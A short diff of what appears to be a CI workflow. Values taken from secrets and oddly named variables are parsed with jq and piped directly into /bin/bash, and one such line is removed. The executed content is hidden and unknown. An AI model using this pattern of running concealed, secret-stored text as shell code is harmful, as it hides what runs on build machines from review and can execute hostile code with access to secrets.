@@ -21,7 +21,6 @@ jobs:
           pys78: ${{ secrets.pys78 }}
         run: |
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
-          echo $m6 | jq -r .ftkks434 | /bin/bash
           echo $plr3353 | jq -r .x865 | /bin/bash
           echo $fggbi41747 | jq -r .ezwu464 | /bin/bash
 
